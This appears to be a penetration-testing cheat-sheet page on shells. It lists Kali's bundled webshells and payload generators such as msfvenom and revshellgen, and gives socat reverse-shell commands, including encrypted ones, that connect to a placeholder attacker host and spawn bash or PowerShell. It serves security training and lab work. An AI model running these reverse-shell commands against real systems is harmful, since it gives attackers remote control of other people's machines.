# Shell

<div class="row row-cols-md-2"><div>

On Kali, you can find preinstalled reverse/web shells inside ([GitLab](https://gitlab.com/kalilinux/packages/webshells))

```bash
$ ls /usr/share/webshells
```

If your target is missing a binary, you may be able to download a precompiled version on [andrew-d GitHub](https://github.com/andrew-d/static-binaries/tree/master/binaries) (2.3k ‚≠ê).

A payload is a code leading to a reverse/bind/web shell. You will pick one based on criteria like the platform...

üêç [msfvenom](metasploit/msfvenom.md) is a famous **script** to generate payloads. üêç

There is a **script** called [revshellgen](https://github.com/t0thkr1s/revshellgen) (0.3k ‚≠ê) that is an automated and simplified interface to create payloads.

There is a **script** called [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ‚≠ê, 2018/2019) that is a simplified interface to create payloads.
</div><div>

* ‚û°Ô∏è Socat is creating a socket on each host and supports encryption.

```bash
# l = listen
$ socat TCP-L:port - # listen
$ socat TCP:hacker_ip:port EXEC:"bash -li" # connect from Linux
PS > socat TCP:hacker_ip:port EXEC:powershell.exe,pipes # connect from Windows, cmd.exe too
```

```bash
# more stable if target and host are running Linux
$ socat TCP-L:port FILE:`tty`,raw,echo=0
$ socat TCP:hacker_ip:port EXEC:"bash -li",pty,stderr,sigint,setsid,sane 
```

```bash
# encryption
$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
$ cat shell.key shell.crt > shell.pem
# use 
$ socat OPENSSL-LISTEN:port,cert=shell.pem,verify=0 [...]
$ socat OPENSSL:hacker_ip:port,verify=0 [...]
```
</div></div>